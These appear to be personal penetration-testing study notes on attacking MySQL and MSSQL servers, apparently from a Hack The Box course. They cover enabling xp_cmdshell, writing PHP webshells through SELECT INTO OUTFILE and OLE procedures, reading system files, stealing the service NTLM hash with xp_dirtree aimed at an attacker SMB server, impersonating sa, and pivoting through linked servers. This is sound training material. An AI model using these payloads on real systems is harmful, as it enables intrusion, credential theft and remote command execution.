- Databases hosts are considered to be high targets since they are responsible for **storing all kinds of sensitive data**, including, but not limited to, user **credentials, `Personal Identifiable Information (PII)`, business-related data, and payment information**.
- If we gain access to a database, we may be able to leverage those privileges for more actions, including **lateral movement and privilege escalation.**

## Enumeration
---
[[MySQL]], [[MSSQL]]
- By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. 
- However, when MSSQL operates in a **"hidden" mode, it uses the `TCP/2433`** port.
- We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:
	- `nmap -Pn -sV -sC -p1433 10.10.10.125`

# Authentication Mechanisms
---
- `MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

- In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to **bypass authentication by repeatedly using the same incorrect password** for the given account **because the `timing attack` vulnerability** existed in the way MySQL handled authentication attempts.
- In this timing attack, **MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt**. 
- By measuring the time it takes the server to respond, **we can determine when the correct password has been found,** even if the server does not indicate success or failure.

## Misconfigurations
- Misconfigured authentication in SQL Server can let us access the service without credentials if **anonymous access is enabled**, **a user without a password is configured,** or any user, group, or machine is allowed to access the SQL Server.

## Privileges
- Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:
	- Read or change the contents of a database
	- Read or change the server configuration
	- **==Execute commands==**
	- Read local files
	- Communicate with other databases
	- **Capture the local system hash**
	- **Impersonate existing users**
	- **Gain access to other networks**

# Protocol Specific Attacks
---
## Read/Change the Database
- If our goal is not just getting access to the data, we will need to **pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations**, and more

- MySQL - Connecting to the SQL Server:
	- `mysql -u julio -pPassword123 -h 10.129.20.13`
- Sqlcmd - Connecting to the SQL Server:
	- `sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`
	  
	- **Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output.

- If we are **targetting `MSSQL` from Linux**, we can use `sqsh` as an alternative to `sqlcmd`:
	- `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`

- Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`:
	- `mssqlclient.py -p 1433 julio@10.129.203.7`
- **Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

- When using **==Windows Authentication, we need to specify the domain name or the hostname==** of the target machine. 
- If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server.
- If we are **targetting a local account, we can use `SERVERNAME\\accountname`** or `.\\accountname`. The full command would look like:
	- `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`

# SQL Default Databases
---
**Note:** We will get an error if we try to list or connect to a database we don't have permissions to.

- `MySQL` default system schemas/databases:
	- `mysql` - is the system database that contains tables that store **information required by the MySQL server**
	- ==**`information_schema`== - provides access to database metadata**
	- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
	- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

- `MSSQL` default system schemas/databases:
	- `master` - keeps the information for an instance of SQL Server.
	- `msdb` - used by SQL Server Agent.
	- `model` - a template database copied for each new database.
	- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
	- `tempdb` - keeps temporary objects for SQL queries.

# SQL Syntax
---
- Show Databases:
	- `SHOW DATABASES;`
- If we use `sqlcmd`, **we will need to use `GO` after our query to execute the SQL syntax.**
	- `SELECT name FROM master.dbo.sysdatabases`
	- `GO`

- Select a Database:
	- `USE htbusers;`
	- SQLCMD:
		- `USE htbusers;`
		- `GO`

- Show Tables:
	- `SHOW TABLES;`
	- SQLCMD:
		- `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES`
		- `GO`

# Execute Commands
---
- `Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system.
- `MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) ==**called [xp_cmdshell]==(https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)** which allow us to e**==xecute system commands using SQL.==** Keep in mind the following about `xp_cmdshell`:
	- `xp_cmdshell` is a powerful feature and **disabled by default.** `xp_cmdshell` **==can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)==**
	- The Windows process spawned by `xp_cmdshell` **==has the same security rights as the SQL Server service account==**

- To execute commands using SQL syntax on MSSQL, use:
	- `xp_cmdshell 'whoami'`
	- `GO`
- If `xp_cmdshell` is not enabled, **==we can enable it, if we have the appropriate privileges==**, using the following command:
  
```mysql
	-- To allow advanced options to be changed.  
	EXECUTE sp_configure 'show advanced options', 1
	GO
	-- To update the currently configured value for advanced options.  
	RECONFIGURE
	GO  
	-- To enable the feature.  
	EXECUTE sp_configure 'xp_cmdshell', 1
	GO  
	-- To update the currently configured value for this feature.  
	RECONFIGURE
	GO
	```

# Write Local Files
----
- **`MySQL` does not have a stored procedure like `xp_cmdshell`**, but we can **==achieve command execution if we write to a location in the file system that can execute our commands.==**
- If we have the appropriate privileges, we can attempt to **write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in ==the webserver directory**.== 
- Then **==we can browse to the location where the file is and execute our commands.==**

- MySQL - Write Local File:
	- `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

- In `MySQL`, a **global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations**, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. 
- These **==operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege==**.
	- ![[Pasted image 20250710075527.png]]

- MySQL - Secure File Privileges:
	- `show variables like "secure_file_priv";`
	- ![[Pasted image 20250710075606.png]]
	  
- To **write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)**, which requires admin privileges, and then execute some stored procedures to create the file.
- MSSQL - Enable Ole Automation Procedures:
	- `sp_configure 'show advanced options', 1`
	- `GO`
	- `sp_configure 'Ole Automation Procedures', 1`
	- `GO`
	- `RECONFIGURE`
	- `GO`

- MSSQL - Create a File:
	```MYSQL
	DECLARE @OLE INT
	DECLARE @FileID INT
	EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
	EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
	EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
	EXECUTE sp_OADestroy @FileID
	EXECUTE sp_OADestroy @OLE
	GO
	```

# Read Local Files
---
- By default, **`MSSQL` allows file read on any file in the operating system to which the account has read access**. We can use the following SQL query:
	- `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
	- `GO`

- By default a **MySQL installation does NOT allow arbitrary file read,** but if the correct settings are in place and **with the appropriate privileges, we can read files using the following methods:**
	- `select LOAD_FILE("/etc/passwd");`


# ==Capture MSSQL Service Hash==
---
[[Attacking SMB]]
- In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system.
- We can also **==steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories==** under a specified parent directory from the file system.
- When we use one of these stored procedures and point it to our SMB server, the **directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server**

- XP_DIRTREE Hash Stealing:
	- `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
	- `GO`

- XP_SUBDIRS Hash Stealing:
	- `EXEC master..xp_subdirs '\\10.10.110.17\share\'`
	- `GO`

- If the service account has access to our server, we will obtain its hash. **==We can then attempt to crack the hash or relay it to another host.==**


## XP_SUBDIRS Hash Stealing with Responder
- `sudo responder -I tun0`

## XP_SUBDIRS Hash Stealing with impacket
- `sudo impacket-smbserver share ./ -smb2support`

# ==Impersonate Existing Users with MSSQL==
---
- SQL Server has a **special permission, named `IMPERSONATE`**, that **==allows the executing user to take on the permissions of another user==** or login until the context is reset or the session ends.
- First, **we need to identify users that we can impersonate**. 
- **Sysadmins can impersonate anyone by default**, But for **==non-administrator users, privileges must be explicitly assigned==**:
  
	- `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
	- `GO`
	- ![[Pasted image 20250710080638.png]]

- To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
	- `SELECT SYSTEM_USER`
	- `SELECT IS_SRVROLEMEMBER('sysadmin')`
	- `GO`
	- ![[Pasted image 20250710080706.png]]
- As the returned value `0` indicates, **we do not have the sysadmin role**, but **we can impersonate the `sa` user.**
- To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.
- **Impersonating the SA User**:
	- `EXECUTE AS LOGIN = 'sa'`
	- `SELECT SYSTEM_USER`
	- `SELECT IS_SRVROLEMEMBER('sysadmin')`
	- `GO`
	- ![[Pasted image 20250710080825.png]]

- **Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.
- We can now **==execute any command as a sysadmin as the returned value `1`==** indicates.
- **To** revert the operation and return to our previous user, **we can use the Transact-SQL statement `REVERT`.**
  
- **Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

# Communicate with Other Databases with MSSQL
---
- `MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine).
- Linked servers are typically configured to enable the database engine to **execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle**.
- If we manage to gain access to a SQL Server with a linked server configured, **we may be able to move laterally to that database server.**
- Administrators can configure a linked server **==using credentials from the remote server.==**
- If those **credentials have sysadmin privileges,** **we may be able to execute commands in the remote SQL instance**

- Identify linked Servers in MSSQL:
	- `SELECT srvname, isremote FROM sysservers`
	- `GO`
	- ![[Pasted image 20250710081131.png]]
	- As we can see in the query's output, we have the name of the server and the column `isremote`, **==where `1` means is a remote server,==** and `0` is a linked server.

- The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers.
- We add our **command between parenthesis and specify the linked server between square brackets** (`[ ]`):

	- `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`
	- `GO`
	- ![[Pasted image 20250710081240.png]]

# Labs
---
- Login as htbdbuser:
	- `impacket-mssqlclient htbdbuser@10.129.203.12`
- Run responder and do dirtree to access the smb server and get the hash.
- Crack the hash using hashcat and login as `mssqslsvc` user with `-windows-auth` and cracked password:
	- `impacket-mssqlclient mssqlsvc@10.129.203.12 -windows-auth`